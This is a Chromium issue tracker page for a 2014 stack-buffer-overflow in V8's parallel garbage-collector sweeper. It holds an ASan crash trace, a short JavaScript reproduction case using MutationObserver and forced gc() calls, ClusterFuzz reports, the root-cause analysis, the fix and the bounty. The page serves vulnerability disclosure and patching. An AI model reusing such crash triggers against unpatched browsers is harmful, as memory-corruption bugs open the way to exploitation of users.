# Stack-buffer-overflow in v8::internal::MarkCompactCollector::SweepInParallel

| Field | Value |
|-------|-------|
| **Issue ID** | [40081024](https://issues.chromium.org/issues/40081024) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Reporter** | cl...@gmail.com |
| **Assignee** | hp...@chromium.org |
| **Created** | 2014-12-16 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase require the --js-flags=--expose-gc flag and might require a few reloads. It crashes the latest chrome asan build as follows. During minimising I have also seen global-buffer-overflows so I suspect a wild memory access, maybe a V8 issue?

=================================================================  

==22704==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7f117fc40e63 at pc 0x7f11c506f9ba bp 0x7f11a81fe510 sp 0x7f11a81fe508  

WRITE of size 16 at 0x7f117fc40e63 thread T9 (WorkerPool/2272)  

#0 0x7f11c506f9b9 in MarkWordToObjectStarts /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/mark-compact.cc:4014  

#1 0x7f11c50ad8b2 in SweepInParallel /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/mark-compact.cc:4030  

#2 0x7f11c286fafd in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/callback.h:396  

#3 0x7f11c285c9b5 in ThreadFunc /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/threading/platform\_thread\_posix.cc:80  

#4 0x7f11ba5a9181 in start\_thread /build/buildd/eglibc-2.19/nptl/pthread\_create.c:312 (discriminator 2)

Address 0x7f117fc40e63 is located in stack of thread T9 (WorkerPool/2272) at offset 99 in frame  

#0 0x7f11c506edef in SweepInParallel /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/mark-compact.cc:4042

This frame has 2 object(s):  

[32, 96) 'offsets.i' <== Memory access at offset 99 overflows this variable  

[128, 400) 'private\_free\_list'  

HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext  

(longjmp and C++ exceptions \*are\* supported)  

Thread T9 (WorkerPool/2272) created by T0 (chrome) here:  

#0 0x7f11c187c690 in \_\_interceptor\_pthread\_create ??:?  

#1 0x7f11c285c112 in CreateThread /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/threading/platform\_thread\_posix.cc:120  

#2 0x7f11c285c59e in CreateNonJoinable /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/threading/platform\_thread\_posix.cc:224  

#3 0x7f11c286edf3 in AddTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/threading/worker\_pool\_posix.cc:172  

#4 0x7f11c286e741 in PostTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/threading/worker\_pool\_posix.cc:153  

#5 0x7f11c871fb01 in CallOnBackgroundThread /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../gin/v8\_platform.cc:31  

#6 0x7f11c5046201 in StartSweeperThreads /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/mark-compact.cc:467  

#7 0x7f11c503e3af in CollectGarbage /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/mark-compact.cc:318  

#8 0x7f11c4f96dcd in MarkCompact /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/heap.cc:1209  

#9 0x7f11c4f93b4a in PerformGarbageCollection /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/heap.cc:1096  

#10 0x7f11c4f92eb4 in CollectGarbage /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/heap.cc:844  

#11 0x7f11c4f9275f in CollectGarbage /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/heap-inl.h:583  

#12 0x7f11c4cbc3da in RequestGarbageCollectionForTesting /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/api.cc:6489  

#13 0x7f11c585939e in Call /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/arguments.cc:33  

#14 0x7f11c4d423df in HandleApiCallHelper<false> /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/builtins.cc:1139  

#15 0x7f11864071ba (<unknown module>)  

#16 0x7f118646e502 (<unknown module>)  

#17 0x7f11864068f4 (<unknown module>)  

#18 0x7f118643775b (<unknown module>)  

#19 0x7f1186432210 (<unknown module>)  

#15 0x7f11c4e8f0c4 in Invoke /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/execution.cc:103  

#16 0x7f11c4cad116 in Call /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/api.cc:4170  

#17 0x7f11c7beb8cf in callFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:387  

#18 0x7f11c7b68983 in callFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:170  

#19 0x7f11c86f1a12 in call /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8MutationCallback.cpp:76  

#20 0x7f11c5eb7fc3 in deliver /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/MutationObserver.cpp:236  

#21 0x7f11c5eb99f5 in deliverMutations /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/MutationObserver.cpp:267  

#22 0x7f11c5eb389f in microtaskFunctionCallback /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Microtask.cpp:67  

#23 0x7f11c536453c in RunMicrotasks /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/isolate.cc:2496  

#24 0x7f11c5eb35af in performCheckpoint /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Microtask.cpp:54  

#25 0x7f11c7be8488 in didLeaveScriptContext /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8RecursionScope.cpp:41  

#26 0x7f11c7beb92e in ~V8RecursionScope /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8RecursionScope.h:75  

#27 0x7f11c7b68983 in callFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:170  

#28 0x7f11c7b6812a in callFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:154 (discriminator 3)  

#29 0x7f11c7bcf2a2 in callListenerFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8LazyEventListener.cpp:99  

#30 0x7f11c7ba950b in invokeEventHandler /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:128  

#31 0x7f11c7ba8ecc in handleEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:98  

#32 0x7f11c7bcf4f7 in handleEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8LazyEventListener.cpp:117  

#33 0x7f11c5ff5c87 in fireEventListeners /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/events/EventTarget.cpp:352  

#34 0x7f11c5ff48ab in fireEventListeners /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/events/EventTarget.cpp:288  

#35 0x7f11c6b9110f in dispatchEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1678  

#36 0x7f11c6b8efcf in dispatchLoadEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1646  

#37 0x7f11c6b8fca4 in dispatchWindowLoadEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:487  

#38 0x7f11c5de8bd0 in implicitClose /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:2533  

#39 0x7f11c6dddc4e in checkCompleted /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/loader/FrameLoader.cpp:501  

#40 0x7f11c6dd9221 in finishedParsing /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/loader/FrameLoader.cpp:431  

#41 0x7f11c5e101c1 in finishedParsing /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:4644  

#42 0x7f11c6318837 in end /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:808  

#43 0x7f11c631ee62 in processParsedChunkFromBackgroundParser /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:469  

#44 0x7f11c631a9ff in pumpPendingSpeculations /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:517  

#45 0x7f11c631c87a in didReceiveParsedChunkFromBackgroundParser /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:338  

#46 0x7f11c64ff68a in operator() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:88 (discriminator 4)  

#47 0x7f11c4b7a6cf in operator() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:513  

#48 0x7f11c28a85df in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/callback.h:396  

#49 0x7f11c27e284c in RunTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:436  

#50 0x7f11c27e38c5 in DeferOrRunPendingTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:446  

#51 0x7f11c27e9f7e in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_pump\_default.cc:32  

#52 0x7f11c28169a8 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/run\_loop.cc:55  

#53 0x7f11c27e0fc6 in base::MessageLoop::Run() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:298  

#54 0x7f11cc16c423 in RendererMain /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/renderer/renderer\_main.cc:235  

#55 0x7f11c2750b43 in RunZygote /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main\_runner.cc:347  

#56 0x7f11c2752ec6 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main\_runner.cc:789  

#57 0x7f11c2750178 in ContentMain /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main.cc:19  

#58 0x7f11c18af8d4 in ChromeMain /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../chrome/app/chrome\_main.cc:66  

#59 0x7f11b7760ec4 in \_\_libc\_start\_main /build/buildd/eglibc-2.19/csu/libc-start.c:287

SUMMARY: AddressSanitizer: stack-buffer-overflow ??:0 ??  

Shadow bytes around the buggy address:  

0x0fe2aff80170: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5  

0x0fe2aff80180: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5  

0x0fe2aff80190: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5  

0x0fe2aff801a0: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5  

0x0fe2aff801b0: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5  

=>0x0fe2aff801c0: f1 f1 f1 f1 00 00 00 00 00 00 00 00[f2]f2 f2 f2  

0x0fe2aff801d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fe2aff801e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fe2aff801f0: 00 00 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 00 00 00 00  

0x0fe2aff80200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fe2aff80210: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

==22704==ABORTING

**VERSION**  

Chrome Version: asan-linux-release-308523

**REPRODUCTION CASE**

<script>
function start() {
o23=document.body;
o39=new MutationObserver(cb\_observer\_136\_1);
o39.observe(top.o23, {childList: true, attributes: true, characterDataOldValue: true});
o23.style.position='fixed';
}
function cb\_observer\_136\_1(arg) {
to=arg.shift();
gc();
gc();
gc();
}
</script>
<body onload="start()"></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

## Timeline

### cl...@chromium.org (2014-12-16)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=6434288718315520

### in...@chromium.org (2014-12-16)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-12-16)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-12-16)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6434288718315520

Uploader: inferno@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Stack-buffer-overflow WRITE 16
Crash Address: 0x7f1137402060
Crash State:
  v8::internal::MarkCompactCollector::SweepInParallel
  v8::internal::MarkCompactCollector::SweeperTask::Run
  base::WorkerThread::ThreadMain
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=285011:285350

Minimized Testcase (0.31 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94LFTIcqD3NatcpInGwyQ7P8QPlnvmzVcVl1uRXdLrbJ70dySESR3BaMG38UT44M1g_mnYXdSvRHsa87iBub0r10lbykKEKmibrkeAoEg1LSESro-yPVZn2btlBY3tUoY8Dj7NUiK6KwUTFv53Tbjydb_rAJw
<script>
function start() {
o23=document.body;
o39=new MutationObserver(cb_observer_136_1);
o39.observe(top.o23, {childList: true, attributes: true, characterDataOldValue: true});
o23.style.position='fixed';
}
function cb_observer_136_1(arg) {
to=arg.shift();
gc();
gc();
gc();
}
</script>
<body onload="start()">




### da...@chromium.org (2014-12-16)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-12-16)

[Empty comment from Monorail migration]

### [Deleted User] (2014-12-17)

[Empty comment from Monorail migration]

### hp...@chromium.org (2014-12-17)

Looking into this now. It reproduces in debug mode on TOT.

### hp...@chromium.org (2014-12-17)

The elements array of an object gets left trimmed. At GC time, a shared function info still points to the original elements array, which is a filler word right now (after left trimming). This must not happen. Bisecting now.

### hp...@chromium.org (2014-12-17)

Apparently the bug was introduced with V8 Version 3.26.15 (based on bleeding_edge revision r20740. Investigating further. Chromium version 36.0.1942.0.

### hp...@chromium.org (2014-12-17)

V8 revision 20735 "Handlify Heap::AllocateJSArrayStorage and friends." causes the problem https://codereview.chromium.org/236983002
The handle of the elements store will still point to the elements store when a GC happens later. If the the elements got left trimmed, the handle will point to the filler. Fix is in flight.

### hp...@chromium.org (2014-12-18)

Fix is in the CQ: https://codereview.chromium.org/813023002
We have to backmerge the fix, stable is effected.

### ma...@google.com (2014-12-18)

[Automated comment] No bugdroid (commit) comments found, couldn't auto-approve, needs manual review.

### in...@chromium.org (2014-12-18)

No more m39 patches, needs to be merged to M40.

### hp...@chromium.org (2014-12-18)

Should I merge it to M40 right away?

### cl...@chromium.org (2014-12-18)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-12-20)

ClusterFuzz has detected this issue as fixed in range 309171:309192.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6434288718315520

Uploader: inferno@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Stack-buffer-overflow WRITE 16
Crash Address: 0x7f1137402060
Crash State:
  v8::internal::MarkCompactCollector::SweepInParallel
  v8::internal::MarkCompactCollector::SweeperTask::Run
  base::WorkerThread::ThreadMain
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=285011:285350
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=309171:309192

Minimized Testcase (0.31 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94LFTIcqD3NatcpInGwyQ7P8QPlnvmzVcVl1uRXdLrbJ70dySESR3BaMG38UT44M1g_mnYXdSvRHsa87iBub0r10lbykKEKmibrkeAoEg1LSESro-yPVZn2btlBY3tUoY8Dj7NUiK6KwUTFv53Tbjydb_rAJw
<script>
function start() {
o23=document.body;
o39=new MutationObserver(cb_observer_136_1);
o39.observe(top.o23, {childList: true, attributes: true, characterDataOldValue: true});
o23.style.position='fixed';
}
function cb_observer_136_1(arg) {
to=arg.shift();
gc();
gc();
gc();
}
</script>
<body onload="start()">

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.


### hp...@chromium.org (2014-12-22)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-12-22)

[Empty comment from Monorail migration]

### ti...@google.com (2015-01-22)

Happy money day - $3000 for this one as well.

### ti...@google.com (2015-03-09)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-03-27)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-04-07)

Processing via our e-payment system can take up to six weeks, but the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/442710?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081024)*
